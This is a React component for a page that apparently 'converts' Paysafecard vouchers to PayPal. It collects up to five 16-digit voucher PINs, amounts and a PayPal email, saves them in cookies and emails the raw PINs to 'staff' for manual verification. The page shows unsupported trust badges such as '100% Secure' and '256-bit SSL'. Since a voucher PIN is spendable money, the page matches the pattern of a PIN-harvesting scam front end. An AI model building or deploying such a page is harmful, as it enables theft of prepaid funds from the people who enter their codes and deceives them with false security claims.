import { useState, useEffect } from 'react';
import { Link } from 'react-router-dom';
import { motion, AnimatePresence } from 'framer-motion';
import { 
  FaLock, FaShieldAlt, FaCheckCircle, FaPlusCircle, 
  FaTrash, FaCreditCard, FaPaypal, FaInfoCircle, 
  FaHistory, FaExclamationCircle 
} from 'react-icons/fa';
import Select from 'react-select';
import { toast, ToastContainer } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';
import { saveTransaction } from '../utils/transactionUtils';
import { sendTransactionEmail } from '../utils/emailService';

const countries = [
  { value: 'de', label: '🇩🇪 Germany', rate: 0.95, currency: '€' },
  { value: 'uk', label: '🇬🇧 United Kingdom', rate: 0.92, currency: '£' },
  { value: 'fr', label: '🇫🇷 France', rate: 0.94, currency: '€' },
  { value: 'es', label: '🇪🇸 Spain', rate: 0.94, currency: '€' },
  { value: 'it', label: '🇮🇹 Italy', rate: 0.94, currency: '€' },
  { value: 'pt', label: '🇵🇹 Portugal', rate: 0.93, currency: '€' },
  { value: 'nl', label: '🇳🇱 Netherlands', rate: 0.94, currency: '€' },
  { value: 'be', label: '🇧🇪 Belgium', rate: 0.94, currency: '€' },
  { value: 'at', label: '🇦🇹 Austria', rate: 0.95, currency: '€' },
  { value: 'ch', label: '🇨🇭 Switzerland', rate: 0.92, currency: 'CHF' },
  { value: 'se', label: '🇸🇪 Sweden', rate: 0.93, currency: 'SEK' },
  { value: 'no', label: '🇳🇴 Norway', rate: 0.92, currency: 'NOK' },
  { value: 'dk', label: '🇩🇰 Denmark', rate: 0.93, currency: 'DKK' },
  { value: 'pl', label: '🇵🇱 Poland', rate: 0.92, currency: 'PLN' },
  { value: 'cz', label: '🇨🇿 Czech Republic', rate: 0.92, currency: 'CZK' },
  { value: 'sk', label: '🇸🇰 Slovakia', rate: 0.93, currency: '€' },
  { value: 'hu', label: '🇭🇺 Hungary', rate: 0.91, currency: 'HUF' },
  { value: 'ro', label: '🇷🇴 Romania', rate: 0.91, currency: 'RON' },
  { value: 'bg', label: '🇧🇬 Bulgaria', rate: 0.91, currency: 'BGN' },
  { value: 'hr', label: '🇭🇷 Croatia', rate: 0.92, currency: '€' },
  { value: 'si', label: '🇸🇮 Slovenia', rate: 0.93, currency: '€' },
  { value: 'gr', label: '🇬🇷 Greece', rate: 0.92, currency: '€' },
  { value: 'cy', label: '🇨🇾 Cyprus', rate: 0.93, currency: '€' },
  { value: 'mt', label: '🇲🇹 Malta', rate: 0.93, currency: '€' },
  { value: 'ie', label: '🇮🇪 Ireland', rate: 0.94, currency: '€' },
  { value: 'fi', label: '🇫🇮 Finland', rate: 0.94, currency: '€' },
  { value: 'lu', label: '🇱🇺 Luxembourg', rate: 0.95, currency: '€' },
  { value: 'is', label: '🇮🇸 Iceland', rate: 0.91, currency: 'ISK' },
  { value: 'li', label: '🇱🇮 Liechtenstein', rate: 0.93, currency: 'CHF' },
  { value: 'tr', label: '🇹🇷 Turkey', rate: 0.90, currency: 'TRY' }
];

const customSelectStyles = {
  control: (base, state) => ({
    ...base,
    border: state.isFocused ? '2px solid var(--primary)' : '1px solid #e2e8f0',
    borderRadius: '0.375rem',
    padding: '2px',
    boxShadow: 'none',
    '&:hover': {
      border: '2px solid var(--primary)',
    },
    transition: 'all 0.3s ease'
  }),
  option: (base, state) => ({
    ...base,
    backgroundColor: state.isSelected ? 'var(--primary)' : state.isFocused ? '#f0f9ff' : '',
    '&:hover': {
      backgroundColor: '#f0f9ff',
    },
    cursor: 'pointer'
  }),
  menu: (base) => ({
    ...base,
    borderRadius: '0.5rem',
    boxShadow: '0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1)',
  })
};

function Convert() {
  const [cards, setCards] = useState([
    { id: 1, pin: '', amount: '', country: null }
  ]);
  const [email, setEmail] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [step, setStep] = useState(1);
  const [showRateInfo, setShowRateInfo] = useState(false);
  const [currentTime, setCurrentTime] = useState(new Date());
  const [transactionId, setTransactionId] = useState('');

  useEffect(() => {
    const timer = setInterval(() => setCurrentTime(new Date()), 1000);
    return () => clearInterval(timer);
  }, []);

  const addCard = () => {
    if (cards.length < 5) {
      const newCard = { 
        id: cards.length + 1, 
        pin: '', 
        amount: '', 
        country: null 
      };
      setCards([...cards, newCard]);
      toast.success('New card added!', {
        icon: '🎉'
      });
    } else {
      toast.warning('Maximum 5 cards allowed', {
        icon: '⚠️'
      });
    }
  };

  const removeCard = (id) => {
    if (cards.length > 1) {
      setCards(cards.filter(card => card.id !== id));
      toast.info('Card removed', {
        icon: '🗑️'
      });
    } else {
      toast.error('At least one card is required', {
        icon: '❌'
      });
    }
  };

  const updateCard = (id, field, value) => {
    setCards(cards.map(card => 
      card.id === id ? { ...card, [field]: value } : card
    ));
  };

  const calculateTotal = () => {
    return cards.reduce((sum, card) => {
      const countryData = card.country ? countries.find(c => c.value === card.country.value) : null;
      const rate = countryData?.rate || 0.95;
      const amount = Number(card.amount) || 0;
      return sum + (amount * rate);
    }, 0);
  };

  const formatPin = (pin) => {
    return pin.replace(/(\d{4})/g, '$1 ').trim();
  };

  const validateEmail = (email) => {
    return email.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true);

    try {
      // Validação dos campos
      const isValid = cards.every(card => 
        card.pin && 
        card.amount && 
        card.country && 
        card.pin.length === 16 && 
        Number(card.amount) > 0
      ) && validateEmail(email);

      if (!isValid) {
        toast.error('Please fill all fields correctly');
        setIsLoading(false);
        return;
      }

      // Gera ID único para a transação
      const newTransactionId = `PSC${Math.random().toString(36).substr(2, 9).toUpperCase()}`;
      setTransactionId(newTransactionId);

      // Prepara os dados da transação
      const transactionData = {
        id: newTransactionId,
        amount: calculateTotal().toFixed(2),
        email: email,
        cards: cards.map(card => ({
          pin: card.pin,
          amount: card.amount,
          country: card.country
        })),
        date: new Date().toISOString()
      };

      // Mostra toast de processamento
      toast.info('Processing your request...', {
        autoClose: 2000
      });

      // Salva nos cookies
      saveTransaction(transactionData);

      // Envia email
      await sendTransactionEmail(transactionData);

      // Atualiza UI e mostra mensagem de sucesso
      toast.success('Conversion request submitted successfully!');
      setIsLoading(false);
      setStep(2);

    } catch (error) {
      console.error('Submission error:', error);
      toast.error('An error occurred. Please try again.');
      setIsLoading(false);
    }
  };

  return (
    <div className="max-w-4xl mx-auto px-4 py-12">
      <ToastContainer position="top-right" theme="colored" />
      
      <motion.div 
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        className="bg-white rounded-xl shadow-2xl p-8 relative overflow-hidden"
      >
        {/* Background Pattern */}
        <div className="absolute top-0 right-0 w-40 h-40 opacity-10">
          <div className="absolute transform rotate-45 bg-gradient-to-r from-blue-500 to-cyan-500 w-40 h-40"></div>
        </div>

        <div className="relative">
          {/* Header Section */}
          <div className="flex items-center justify-between mb-8">
            <div className="flex items-center space-x-4">
              <motion.div
                initial={{ scale: 0 }}
                animate={{ scale: 1 }}
                transition={{ type: "spring", stiffness: 260, damping: 20 }}
              >
                <FaShieldAlt className="text-[--primary] text-5xl" />
              </motion.div>
              <div>
                <h2 className="text-3xl font-bold gradient-text">Secure Conversion</h2>
                <p className="text-gray-600">
                  {currentTime.toLocaleTimeString()} - Verification Required
                </p>
              </div>
            </div>
            <motion.button
              onClick={() => setShowRateInfo(!showRateInfo)}
              className="text-[--primary] hover:text-[--secondary]"
              whileHover={{ scale: 1.1 }}
              whileTap={{ scale: 0.9 }}
            >
              <FaInfoCircle size={24} />
            </motion.button>
          </div>

          {/* Rate Info Modal */}
          <AnimatePresence>
            {showRateInfo && (
              <motion.div
                initial={{ opacity: 0, y: -20 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -20 }}
                className="absolute top-20 right-0 bg-white p-6 rounded-lg shadow-xl z-10 w-80"
              >
                <h3 className="font-bold mb-4 flex items-center">
                  <FaExclamationCircle className="text-[--primary] mr-2" />
                  Important Information
                </h3>
                <div className="space-y-3 text-sm">
                  <p>• All conversions require staff verification</p>
                  <p>• Processing time: 15-30 minutes</p>
                  <p>• Minimum amount: 10 {cards[0]?.country?.currency || '€'}</p>
                  <p>• Maximum amount: 1000 {cards[0]?.country?.currency || '€'}</p>
                  <div className="border-t pt-3 mt-3">
                    <p className="font-semibold">Current Status: Active</p>
                    <p className="text-green-600">All systems operational</p>
                  </div>
                </div>
              </motion.div>
            )}
          </AnimatePresence>

          {step === 1 ? (
            <form onSubmit={handleSubmit} className="space-y-8">
              {/* Cards Section */}
              <div className="bg-gray-50 p-6 rounded-xl">
                <div className="flex justify-between items-center mb-6">
                  <div className="flex items-center space-x-2">
                    <FaCreditCard className="text-[--primary]" />
                    <h3 className="text-xl font-semibold">Your Paysafecards</h3>
                  </div>
                  <motion.button
                    type="button"
                    onClick={addCard}
                    className="flex items-center space-x-2 text-[--primary] hover:text-[--secondary] transition-colors bg-white px-4 py-2 rounded-lg shadow-sm"
                    whileHover={{ scale: 1.05 }}
                    whileTap={{ scale: 0.95 }}
                  >
                    <FaPlusCircle />
                    <span>Add Card</span>
                  </motion.button>
                </div>

                <AnimatePresence>
                  {cards.map((card, index) => (
                    <motion.div
                      key={card.id}
                      initial={{ opacity: 0, x: -20 }}
                      animate={{ opacity: 1, x: 0 }}
                      exit={{ opacity: 0, x: 20 }}
                      transition={{ delay: index * 0.1 }}
                      className="bg-white p-6 rounded-lg mb-4 relative hover-card"
                    >
                      <div className="absolute top-4 right-4">
                        {cards.length > 1 && (
                          <motion.button
                            type="button"
                            onClick={() => removeCard(card.id)}
                            whileHover={{ scale: 1.1 }}
                            whileTap={{ scale: 0.9 }}
                            className="text-red-500 hover:text-red-700"
                          >
                            <FaTrash />
                          </motion.button>
                        )}
                      </div>

                      <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                        <div>
                          <label className="block text-gray-700 mb-2">
                            PIN Code
                            <span className="text-red-500 ml-1">*</span>
                          </label>
                          <input
                            type="text"
                            value={formatPin(card.pin)}
                            onChange={(e) => {
                              const value = e.target.value.replace(/[^0-9]/g, '');
                              if (value.length <= 16) {
                                updateCard(card.id, 'pin', value);
                              }
                            }}
                            className="input-field font-mono"
                            placeholder="Enter 16-digit PIN"
                            maxLength="19"
                            required
                          />
                          <div className="text-xs text-gray-500 mt-1">
                            {16 - card.pin.length} digits remaining
                          </div>
                        </div>

                        <div>
                          <label className="block text-gray-700 mb-2">
                            Amount ({card.country ? countries.find(c => c.value === card.country.value)?.currency : '€'})
                            <span className="text-red-500 ml-1">*</span>
                          </label>
                          <input
                            type="number"
                            value={card.amount}
                            onChange={(e) => updateCard(card.id, 'amount', e.target.value)}
                            className="input-field"
                            placeholder="Enter value"
                            min="10"
                            max="1000"
                            required
                          />
                        </div>

                        <div>
                          <label className="block text-gray-700 mb-2">
                            Country
                            <span className="text-red-500 ml-1">*</span>
                          </label>
                          <Select
                            value={card.country}
                            onChange={(value) => updateCard(card.id, 'country', value)}
                            options={countries}
                            styles={customSelectStyles}
                            placeholder="Select country"
                            required
                          />
                        </div>
                      </div>
                    </motion.div>
                  ))}
                </AnimatePresence>
              </div>

              {/* Summary Section */}
              <motion.div
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                className="bg-gradient-to-r from-blue-50 to-cyan-50 p-6 rounded-xl"
              >
                <h3 className="text-lg font-semibold mb-4">Conversion Summary</h3>
                <div className="space-y-3">
                  <div className="flex justify-between items-center">
                    <span className="text-gray-600">Total Amount:</span>
                    <span className="text-2xl font-bold text-[--primary]">
                      {cards[0]?.country ? 
                        `${countries.find(c => c.value === cards[0].country.value)?.currency}${calculateTotal().toFixed(2)}` :
                        `€${calculateTotal().toFixed(2)}`
                      }
                    </span>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="text-gray-600">You'll Receive (PayPal):</span>
                    <span className="text-2xl font-bold text-green-600">
                      €{calculateTotal().toFixed(2)}
                    </span>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="text-gray-600">Processing Fee:</span>
                    <span className="text-green-600">FREE</span>
                  </div>
                  <div className="pt-3 mt-3 border-t">
                    <div className="text-sm text-gray-600">
                      Note: Final amount will be received in Euros (€) in your PayPal account
                    </div>
                  </div>
                </div>
              </motion.div>

              {/* PayPal Section */}
              <div className="space-y-4">
                <div className="flex items-center space-x-2">
                  <FaPaypal className="text-[--primary]" />
                  <label className="block text-gray-700">PayPal Email</label>
                </div>
                <input
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="input-field"
                  placeholder="Enter your PayPal email"
                  required
                />
              </div>

              {/* Trust Badges */}
              <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                {[
                  { icon: FaLock, text: "Secure Payment", subtext: "256-bit SSL" },
                  { icon: FaCheckCircle, text: "Staff Verified", subtext: "15-30 min" },
                  { icon: FaShieldAlt, text: "Protected", subtext: "100% Secure" },
                  { icon: FaHistory, text: "24/7 Support", subtext: "Always here" }
                ].map((item, index) => (
                  <motion.div
                    key={index}
                    className="trust-badge flex-col text-center p-4"
                    initial={{ opacity: 0, y: 20 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ delay: 0.5 + index * 0.1 }}
                  >
                    <item.icon className="text-[--primary] text-2xl mb-2 mx-auto" />
                    <div>
                      <div className="font-semibold">{item.text}</div>
                      <div className="text-xs text-gray-500">{item.subtext}</div>
                    </div>
                  </motion.div>
                ))}
              </div>

              {/* Submit Button */}
              <motion.button
                type="submit"
                className="w-full btn-primary relative overflow-hidden"
                disabled={isLoading}
                whileHover={{ scale: 1.02 }}
                whileTap={{ scale: 0.98 }}
              >
                {isLoading ? (
                  <span className="flex items-center justify-center">
                    <svg className="animate-spin h-5 w-5 mr-3" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
                    </svg>
                    Processing...
                  </span>
                ) : (
                  'Submit for Verification'
                )}
              </motion.button>
            </form>
          ) : (
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              className="text-center py-8"
            >
              <motion.div
                initial={{ scale: 0 }}
                animate={{ scale: 1 }}
                className="text-green-500 text-6xl mb-4"
              >
                <FaCheckCircle className="mx-auto" />
              </motion.div>
              <h3 className="text-2xl font-bold mb-4">Conversion Request Submitted!</h3>
              <p className="text-gray-600 mb-6">
                Your request is being processed by our staff. Please allow 15-30 minutes for verification.
                You will receive updates via email.
              </p>
              <div className="bg-blue-50 p-6 rounded-lg mb-6">
                <p className="text-sm text-gray-600 mb-2">Transaction ID: #{transactionId}</p>
                <p className="text-sm text-gray-600">A confirmation email has been sent to your PayPal email address.</p>
              </div>
              <div className="flex flex-col sm:flex-row justify-center gap-4">
                <motion.button
                  onClick={() => {
                    setStep(1);
                    setCards([{ id: 1, pin: '', amount: '', country: null }]);
                    setEmail('');
                  }}
                  className="btn-primary"
                  whileHover={{ scale: 1.05 }}
                  whileTap={{ scale: 0.95 }}
                >
                  Convert Another Card
                </motion.button>
                <Link 
                  to="/history" 
                  className="btn-primary bg-[--secondary]"
                >
                  View Transaction Status
                </Link>
              </div>
            </motion.div>
          )}
        </div>
      </motion.div>
    </div>
  );
}

export default Convert;
